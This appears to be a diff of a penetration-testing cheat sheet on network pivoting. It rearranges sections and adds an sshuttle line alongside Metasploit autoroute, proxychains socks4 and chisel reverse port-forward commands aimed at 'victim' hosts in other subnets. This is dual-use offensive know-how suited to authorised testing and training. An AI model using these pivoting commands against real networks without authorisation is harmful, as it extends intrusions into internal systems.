@@ -1,4 +1,4 @@
-## Pivot
+## Pivot with Metasploit
 In this case victim 1, in  subnet 2, is initialy used to contact victim 2, in subnet 2.
 But after the reverse shell is ran, the communication is made between the attacker and victim 2.
 
@@ -26,7 +26,7 @@ But after the reverse shell is ran, the communication is made between the attack
 	add socks4 $ip 1080 to proxychains4.conf
 	proxychains [command]
 
-## Pivot if there's no internet access for victim 2
+### Pivot if there's no internet access for victim 2
 In this case victim 1, in subnet 1, is used as a proxy to access subnet 2 so we can contact, through victim 1, victim 2.
 
 	msf > use post/windows/manage/autoroute
@@ -38,10 +38,6 @@ In this case victim 1, in subnet 1, is used as a proxy to access subnet 2 so we 
 	msf > set subnet [subnet2]
 	msf > run
 	exploit using LHOST with the IP of victim 1 
-
-## Pivot with VPNPivot
-	https://github.com/0x36/VPNPivot
-
 ## Pivot with chisel
 
 ### Method 1
@@ -65,4 +61,7 @@ In this case victim 1, in subnet 1, is used as a proxy to access subnet 2 so we 
 
 	chisel client --fingerprint [fingerprint] [chisel server ip]:[chisel server port] R:[attack port to forward to]:[victim ip]:[victim port]
 
-
+## Pivot with SSHUTTLE
+	sshuttle -r user@host 10.10.10.0/24
+## Pivot with VPNPivot
+	https://github.com/0x36/VPNPivot
